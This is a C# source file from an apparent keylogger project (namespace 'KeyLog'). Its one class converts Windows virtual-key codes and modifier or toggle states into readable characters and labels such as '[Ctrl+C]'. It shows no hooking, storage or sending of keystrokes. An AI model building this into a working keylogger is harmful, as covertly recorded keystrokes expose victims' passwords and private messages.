using System.Windows.Forms;
using KeyLog.WindowsApi;


namespace KeyLog.Common {
  class KeyChar {

    static uint OldKey;
    static bool[] Active;


    static bool Scroll {
      get { return Active[(int) VK.SCROLL]; }
    }
    static bool Caps {
      get { return Active[(int) VK.CAPITAL]; }
    }
    static bool Num {
      get { return Active[(int) VK.NUMLOCK]; }
    }
    static bool Ctrl {
      get { return Active[(int) VK.LCONTROL] | Active[(int) VK.RCONTROL]; }
    }
    static bool Alt {
      get { return Active[(int) VK.LMENU] | Active[(int) VK.RMENU]; }
    }
    static bool Shift {
      get { return Active[(int) VK.LSHIFT] | Active[(int) VK.RSHIFT]; }
    }
    static bool Shifted {
      get { return Caps ^ Shift; }
    }


    // Checks if character is visible.
    static bool IsVisible(char c) {
      return c >= ' ' && c <= '~';
    }

    // Give the lower case form of character.
    static char LowerCase(char c) {
      return c >= 'A' && c <= 'Z' ? (char) (c - 'A' + 'a') : c;
    }


    // Is it a Toggle key?
    static bool IsToggleKey(VK k) {
      return k == VK.SCROLL || k == VK.CAPITAL || k == VK.NUMLOCK;
    }

    // Is it a Special key?
    static bool IsSpecialKey(VK k) {
      return k == VK.LSHIFT || k == VK.RSHIFT || k == VK.LCONTROL || k == VK.RCONTROL || k == VK.LMENU || k == VK.RMENU;
    }


    // Initialize.
    public static void Init() {
      Active = new bool[256];
    }


    // Get virtual key as string.
    public static string Name(uint vkCode, bool active) {
      // update old key
      uint k = vkCode;
      bool diff = OldKey != k;
      OldKey = active ? k : 0;
      // update key state
      if (!IsToggleKey((VK) k)) Active[k] = active;
      else if (active && diff)  Active[k] = !Active[k];
      // get name
      if (!active || (IsSpecialKey((VK) k) && !diff)) return "";
      char c = (char) User32.MapVirtualKey(k, MapVK.MAPVK_VK_TO_CHAR);
      if (Ctrl || Alt || (Shift && !IsVisible(c))) return SpecialName(k);
      return CharName(c);
    }

    static string CharName(char c) {
      return (Shifted ? c : LowerCase(c)).ToString();
    }

    static string SpecialName(uint k) {
      return string.Format(" [{0}{1}{2}{3}] ",
        Ctrl?  "Ctrl+"  : "",
        Alt?   "Alt+"   : "",
        Shift? "Shift+" : "",
        NormalName(k)).Replace("+]", "]");
    }

    static string NormalName(uint k) {
      if (IsSpecialKey((VK) k)) return "";
      return ((Keys) k).ToString();
    }
  }
}
